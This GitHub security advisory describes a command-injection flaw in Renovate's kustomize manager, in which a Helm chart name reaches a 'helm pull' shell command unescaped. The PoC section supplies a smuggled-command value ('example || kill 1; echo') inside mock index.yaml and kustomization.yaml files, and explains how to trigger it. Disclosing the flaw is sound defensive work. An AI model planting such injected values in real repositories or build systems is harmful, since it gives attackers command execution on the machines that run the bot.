# [M] Renovate vulnerable to arbitrary command injection via kustomize manager and malicious helm repository

## Summary
Severity: Medium
Advisory: GHSA-xv56-3wq5-9997
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-xv56-3wq5-9997
Type: github-advisory

## Affected
- npm: `renovate` — affected >=39.218.0 <40.33.0

## Details
### Summary
The user-provided chart name in the `kustomize` manager is appended to the `helm pull --untar` command without proper sanitization.

### Details
Adversaries can provide a maliciously crafted `kustomization.yaml` in conjunction with a Helm repo's `index.yaml` file to trick Renovate to execute arbitrary code.
The value for the `depName` argument for the `helmRepositoryArgs` function in [lib/modules/manager/kustomize/artifacts.ts](https://github.com/renovatebot/renovate/blob/cc08c6e98f19e6258c5d3180c70c98e1be0b0d37/lib/modules/manager/kustomize/artifacts.ts#L33) is not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 39.218.9 (https://github.com/renovatebot/renovate/commit/cc08c6e98f19e6258c5d3180c70c98e1be0b0d37), released on March 26 of 2025.

### PoC
1. Create a mock Helm repository. Have its `index.yaml` endpoint return:
```yaml
apiVersion: v1
entries:
  "example || kill 1; echo":
    - version: 1.0.1
      created: 2016-10-06T16:23:20.499814565-06:00
    - version: 1.0.0
      created: 2016-10-06T16:23:20.499543808-06:00
```

2. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  postUpdateOptions: [
    "kustomizeInflateHelmCharts",
  ]
}
```

`kustomization.yaml`:

```yaml
kind: Kustomization
apiVersion: kustomize.config.k8s.io/v1beta1
helmCharts:
  - name: "example || kill 1; echo"
    repo: TODO reference the mocked Helm repository over https
    version: 1.0.0
```
with the todo resolved

`charts/.gitkeep`:

(empty)

3. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

## References
- https://github.com/renovatebot/renovate/security/advisories/GHSA-xv56-3wq5-9997
- https://github.com/renovatebot/renovate
